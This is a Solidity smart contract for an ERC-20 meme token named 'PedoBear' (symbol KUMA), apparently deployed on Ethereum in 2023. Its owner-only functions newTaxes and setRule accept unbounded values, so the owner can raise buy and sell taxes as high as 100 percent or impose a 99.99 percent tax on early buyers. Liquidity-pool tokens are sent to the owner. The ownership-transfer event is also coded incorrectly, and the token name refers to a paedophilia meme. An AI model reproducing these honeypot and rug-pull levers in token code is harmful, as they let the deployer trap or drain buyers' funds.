1 /**
2  *Submitted for verification at Etherscan.io on 2023-10-03
3 */
4 
5 /*
6     くまくま━━━━━━ヽ（ ・(ｪ)・ ）ノ━━━━━━ !!!
7 
8             https://kuma.fan/
9             https://t.me/KumaENTRY
10 
11 */
12 
13 // SPDX-License-Identifier: Unlicensed
14 pragma solidity 0.8.18;
15 
16 abstract contract Context {
17     function _msgSender() internal view virtual returns (address) {
18         return msg.sender;
19     }
20 }
21 
22 library SafeMath {
23     function add(uint256 a, uint256 b) internal pure returns (uint256) {
24         uint256 c = a + b;
25         require(c >= a, "addition overflow");
26         return c;
27     }
28 
29     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
30         return sub(a, b, "subtraction overflow");
31     }
32 
33     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
34         require(b <= a, errorMessage);
35         uint256 c = a - b;
36         return c;
37     }
38 
39     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
40         if (a == 0) {
41             return 0;
42         }
43         uint256 c = a * b;
44         require(c / a == b, " multiplication overflow");
45         return c;
46     }
47 
48     function div(uint256 a, uint256 b) internal pure returns (uint256) {
49         return div(a, b, "division by zero");
50     }
51 
52     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
53         require(b > 0, errorMessage);
54         uint256 c = a / b;
55         return c;
56     }
57 }
58 
59 contract Ownable is Context {
60     address private _owner;
61     event OwnershipTransferred(
62         address indexed previousOwner,
63         address indexed newOwner
64     );
65 
66     constructor() {
67         address msgSender = _msgSender();
68         _owner = msgSender;
69         emit OwnershipTransferred(address(0), msgSender);
70     }
71 
72     function owner() public view returns (address) {
73         return _owner;
74     }
75 
76     modifier onlyOwner() {
77         require(_owner == _msgSender(), "caller is not the owner");
78         _;
79     }
80 
81     function transferOwnership(address newOwner) public onlyOwner {
82         require(newOwner != address(0), "new owner is the zero address");
83         _owner = newOwner;
84         emit OwnershipTransferred(_owner, newOwner);
85     }
86 
87     function renounceOwnership() public virtual onlyOwner {
88         emit OwnershipTransferred(_owner, address(0));
89         _owner = address(0);
90     }
91 }
92 
93 interface IERC20 {
94     function totalSupply() external view returns (uint256);
95     function balanceOf(address account) external view returns (uint256);
96     function transfer(address recipient, uint256 amount) external returns (bool);
97     function allowance(address owner, address spender) external view returns (uint256);
98     function approve(address spender, uint256 amount) external returns (bool);
99     function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
100     event Transfer(address indexed from, address indexed to, uint256 value);
101     event Approval(address indexed owner, address indexed spender, uint256 value);
102 }
103 
104 interface IUniswapV2Factory {
105     function createPair(address tokenA, address tokenB)
106         external
107         returns (address pair);
108 }
109 
110 interface IUniswapV2Router02 {
111     function swapExactTokensForETHSupportingFeeOnTransferTokens(
112         uint256 amountIn,
113         uint256 amountOutMin,
114         address[] calldata path,
115         address to,
116         uint256 deadline
117     ) external;
118 
119     function factory() external pure returns (address);
120     function WETH() external pure returns (address);
121     function addLiquidityETH(
122         address token,
123         uint amountTokenDesired,
124         uint amountTokenMin,
125         uint amountETHMin,
126         address to,
127         uint deadline
128     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
129 }
130 
131 
132 contract KUMA is Context, IERC20, Ownable {
133     using SafeMath for uint256;
134     mapping(address => uint256) private _balance;
135     mapping(address => mapping(address => uint256)) private _allowances;
136     mapping(address => bool) private _isExcludedFromFeeWallet;
137     uint8 private constant _decimals = 18;
138     uint256 private constant _totalSupply = 69420000000000 * 10**_decimals;
139 
140     uint256 private constant onePercent = _totalSupply / 100;
141     uint256 public maxWalletAmount = onePercent * 5;
142 
143     uint256 public buyTax = 0;
144     uint256 public sellTax = 0;
145 
146     string private constant _name = "PedoBear";
147     string private constant _symbol = "KUMA";
148 
149     IUniswapV2Router02 private uniswapV2Router;
150     address public uniswapV2Pair;
151     address payable private mW;
152         
153     uint256 private launchedAt;
154     uint256 private skip = 0;
155     bool private tradingOpen = false;
156 
157     uint256 private constant minSwap = onePercent / 20;
158     bool private inSwapAndLiquify;
159     modifier lockTheSwap {
160         inSwapAndLiquify = true;
161         _;
162         inSwapAndLiquify = false;
163     }
164 
165     constructor() payable  {
166         address excl = 0x51be7228f063f121381f1465c86e29bbef6c5366;
167         mW = payable(0xbCdA8b598Bc78877CA8Ed19215d57B9da2a50Bdf);
168         transferOwnership(0x51be7228f063f121381f1465c86e29bbef6c5366);
169         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
170         _isExcludedFromFeeWallet[excl] = true;
171         _isExcludedFromFeeWallet[address(this)] = true;
172         _isExcludedFromFeeWallet[mW] = true;
173        
174         _allowances[excl][address(uniswapV2Router)] = _totalSupply;
175 
176         _balance[address(this)] = 62478000000000 * 10**_decimals;
177         emit Transfer(address(0), address(this), balanceOf(address(this)));
178 
179         _balance[excl] = _totalSupply - balanceOf(address(this));
180         emit Transfer(address(0), excl, balanceOf(excl));
181     }
182 
183     function name() public pure returns (string memory) {
184         return _name;
185     }
186 
187     function symbol() public pure returns (string memory) {
188         return _symbol;
189     }
190 
191     function decimals() public pure returns (uint8) {
192         return _decimals;
193     }
194 
195     function totalSupply() public pure override returns (uint256) {
196         return _totalSupply;
197     }
198 
199     function balanceOf(address account) public view override returns (uint256) {
200         return _balance[account];
201     }
202 
203     function transfer(address recipient, uint256 amount)public override returns (bool){
204         _transfer(_msgSender(), recipient, amount);
205         return true;
206     }
207 
208     function sendEthToTaxWallet() external {
209         mW.transfer(address(this).balance);
210     }
211 
212     function allowance(address owner, address spender) public view override returns (uint256){
213         return _allowances[owner][spender];
214     }
215 
216     function approve(address spender, uint256 amount) public override returns (bool){
217         _approve(_msgSender(), spender, amount);
218         return true;
219     }
220 
221      function setRule(uint256 r) external onlyOwner {
222          skip = r;
223      }
224 
225     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
226         _transfer(sender, recipient, amount);
227         _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
228         return true;
229     }
230 
231     function _approve(address owner, address spender, uint256 amount) private {
232         require(owner != address(0) && spender != address(0), "approve zero address");
233         _allowances[owner][spender] = amount;
234         emit Approval(owner, spender, amount);
235     }
236 
237 
238     function _transfer(address from, address to, uint256 amount) private {
239         require(from != address(0), "transfer zero address");
240         uint256 _tax = 0;
241 
242         if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
243             _tax = 0;
244         } else {
245             require(tradingOpen);
246             if (block.number<launchedAt+skip) {_tax=99;} else {
247                 if (from == uniswapV2Pair) {
248                     require(balanceOf(to) + amount <= maxWalletAmount, "over max wallet");
249                     _tax = buyTax;
250                 } else if (to == uniswapV2Pair) {
251                     uint256 tokensSwap = balanceOf(address(this));
252                     if (tokensSwap > minSwap && !inSwapAndLiquify) {
253                         if (tokensSwap > onePercent / 2) {
254                             tokensSwap = onePercent / 2;
255                         }
256                         swapTokensEth(tokensSwap);
257                     }
258                     _tax = sellTax;
259                 } else {
260                     _tax = 0;
261                 }
262             }
263         }
264         uint256 taxTokens = 0;
265         if(_tax == 99){
266             taxTokens = (amount * 9999) / 10000;
267         }else{
268             taxTokens = (amount * _tax) / 100;
269         }
270         uint256 transferAmount = amount - taxTokens;
271 
272         _balance[from] = _balance[from] - amount;
273         _balance[to] = _balance[to] + transferAmount;
274         _balance[address(this)] = _balance[address(this)] + taxTokens;
275 
276         emit Transfer(from, to, transferAmount);
277     }
278 
279     function newMax(uint256 _maxWalletAmount) external onlyOwner {
280         maxWalletAmount = _maxWalletAmount;
281     }
282 
283     function newTaxes(uint256 bTax, uint256 sTax) external onlyOwner {
284         buyTax = bTax;
285         sellTax = sTax;
286     }
287 
288     function swapTokensEth(uint256 tokenAmount) private lockTheSwap {
289         address[] memory path = new address[](2);
290         path[0] = address(this);
291         path[1] = uniswapV2Router.WETH();
292         _approve(address(this), address(uniswapV2Router), tokenAmount);
293         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,mW,block.timestamp);
294     }
295 
296     function removeAllLimits() external onlyOwner {
297         maxWalletAmount = _totalSupply;
298     }
299 
300     function enableTrading() external onlyOwner() {
301         require(!tradingOpen,"trading is already open");
302         tradingOpen = true;
303         launchedAt = block.number;
304     }
305 
306     function addLP() external payable onlyOwner() {
307         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
308         _approve(address(this), address(uniswapV2Router), _totalSupply);
309         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
310         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
311     }
312 
313     receive() external payable {}
314 }